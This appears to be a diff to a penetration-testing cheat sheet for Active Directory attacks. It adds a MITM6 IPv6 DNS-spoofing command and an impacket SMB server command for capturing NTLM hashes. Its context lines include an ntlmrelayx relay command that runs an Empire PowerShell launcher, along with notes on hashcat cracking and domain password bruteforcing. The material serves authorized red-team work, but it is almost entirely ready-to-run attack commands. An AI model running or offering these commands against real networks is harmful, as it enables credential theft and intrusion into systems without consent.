@@ -86,6 +86,14 @@ Use hashcat on a more powerful box. This is only for easy wins.
 #### NTLM Relaying 
 
 `ntlmrelayx.py -tf targets.txt -c <insert Empire Powershell launcher>`
+  
+### MITM6
+
+`python mitm6.py -d blah.local`
+
+#### Capture hashes
+
+`impacket-smbserver hiya /tmp/ -smb2support`
 
 ## Bruteforce domain passwords
 ### Common Passwords
